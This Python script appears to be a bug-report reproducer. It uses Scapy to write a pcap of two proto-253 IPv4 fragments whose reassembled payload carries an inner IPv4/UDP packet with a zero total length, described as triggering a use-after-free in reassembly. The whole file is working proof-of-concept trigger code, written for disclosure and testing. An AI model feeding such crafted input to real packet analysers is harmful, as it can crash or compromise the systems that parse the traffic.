#!/usr/bin/env python3
"""Fragmented custom-IP-protocol traffic exposing a Skip reassembly lifetime UAF.

Two IPv4 fragments (proto 253, an RFC 3692 experimental protocol) reassemble
into a datagram consisting of a 14-byte header that the proto-253 handling skips
followed by an inner IPv4/UDP packet whose total-length field is deliberately
zero. The inner IP header straddles the fragment boundary (the last two bytes of
the first fragment are the inner "45 00" version/IHL and length prefix), so the
reassembled buffer is what the skip path parses.

This is an intentionally malformed reproducer: the inner IP total length of 0 is
the point, so dissector complaints about the reassembled payload are expected.
The two outer fragments themselves are well formed.

Generated with OpenAI Codex, adapted with Claude Opus 4.8 to build packets with
Scapy's high-level API. Human review is required before submission.
"""

from pathlib import Path

from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.utils import wrpcap

OUTER_SRC_IP = "192.168.0.1"
OUTER_DST_IP = "192.168.0.2"
INNER_SRC_IP = "10.0.0.1"
INNER_DST_IP = "10.0.0.2"
CLIENT_MAC, SERVER_MAC = "02:00:00:00:00:01", "02:00:00:00:00:02"

# RFC 3692 experimental IP protocol carried by the outer (fragmented) datagram.
OUTER_PROTO = 253
OUTER_IP_ID = 7

# 14 bytes the proto-253 path skips before the inner IP packet begins.
SKIPPED_HEADER = b"\x00" * 14

BASE_TIME = 1_700_000_000.0


def inner_packet():
    """Inner IPv4/UDP packet with a deliberately bogus total length of 0."""
    ip = IP(
        src=INNER_SRC_IP,
        dst=INNER_DST_IP,
        id=8,
        ttl=64,
        proto=17,
        flags=0,
        frag=0,
        len=0,
    )
    udp = UDP(sport=40000, dport=53, len=8, chksum=0)
    return bytes(ip / udp)


def outer_fragment(payload, *, flags, frag):
    """One outer proto-253 fragment carrying a raw slice of the reassembled buffer."""
    return (
        Ether(src=CLIENT_MAC, dst=SERVER_MAC)
        / IP(
            src=OUTER_SRC_IP,
            dst=OUTER_DST_IP,
            id=OUTER_IP_ID,
            ttl=64,
            proto=OUTER_PROTO,
            flags=flags,
            frag=frag,
        )
        / Raw(load=payload)
    )


def main():
    reassembled = SKIPPED_HEADER + inner_packet()
    # Split so the inner IP header straddles the boundary at offset 16 (frag=2).
    packets = [
        outer_fragment(reassembled[:16], flags="MF", frag=0),
        outer_fragment(reassembled[16:], flags=0, frag=2),
    ]

    for index, p in enumerate(packets):
        p.time = BASE_TIME + index * 0.001

    wrpcap(str(Path(__file__).with_suffix("")), packets)


if __name__ == "__main__":
    main()
